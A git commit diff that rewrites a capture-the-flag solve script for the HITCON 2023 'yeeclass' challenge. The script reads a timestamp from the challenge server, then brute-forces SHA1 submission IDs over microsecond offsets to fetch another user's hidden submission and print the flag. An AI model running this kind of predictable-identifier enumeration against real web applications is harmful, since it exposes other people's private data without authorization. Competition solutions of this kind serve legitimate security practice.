41a17e7c291d79ce328820f7e1106f148f8f8c9e
Cain HC Chen <cain19811028@gmail.com>
2023-08-30 15:03:06 +0800

    chore: add yeeclass - solve.py

--- 2023/yeeclass/solve.py
+++ 2023/yeeclass/solve.py
@@ -1,27 +1,41 @@
-import hashlib
-import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import re
+import requests as r
 from datetime import datetime, timezone
+from hashlib import sha1
 
-# http://rectf.hitcon2023.online:30203//submission.php?homeworkid=1
+def fetch_timestamp():
+    res = r.get(f"{host}/submission.php?homeworkid=1")
+    return re.findall("<td>(\d{4}-\d\d-\d\d \d\d:\d\d:\d\d.\d{6})</td>", res.text)[0]
+
+def check(s, u):
+    submission_id = f"{username}_{s:08x}{u:05x}"
+    submission_hash = sha1(submission_id.encode()).hexdigest()
+
+    res = r.get(f"{host}/submission.php?hash={submission_hash}")
+
+    return "Submission not found" not in res.text, (s, u), res.text
+
+host = "http://rectf.hitcon2023.online:30203/"
+
+timestamp = fetch_timestamp()
 username = "flagholder"
-timestamp = "2023-08-16 04:09:35.584096"
+sec, usec = map(int, str(datetime.fromisoformat(timestamp).replace(tzinfo=timezone.utc).timestamp()).split("."))
 
-dt = datetime.fromisoformat(timestamp)
-sec = int(dt.timestamp())
-usec = dt.microsecond
-print(sec, usec)
+offset = 1000
 
-url = "http://rectf.hitcon2023.online:30203/submission.php?hash="
+print(timestamp)
 
-def get_hash(sec, usec):
-    user_id = f"{username}_{sec:08x}{usec:05x}"
-    return hashlib.sha1(user_id.encode()).hexdigest()
+with ThreadPoolExecutor(10) as executor:
+    futures = []
 
-for i in range(0, 1000):
-    hash = get_hash(sec, usec - i)
-    r = requests.get(url + hash)
-    print(i, hash)
-    if r.text != "Submission not found.":
-        print("found hash:", hash)
-        print(r.text)
-        break
+    for v in range(usec, usec-offset, -1):
+        futures.append(executor.submit(check, sec, v))
+
+    for future in as_completed(futures):
+        result = future.result()
+
+        if result[0]:
+            s, u = result[1]
+            print(datetime.utcfromtimestamp(float(f"{s}.{u}")))
+            print(re.findall("<pre>(.*)</pre>", result[2])[0])
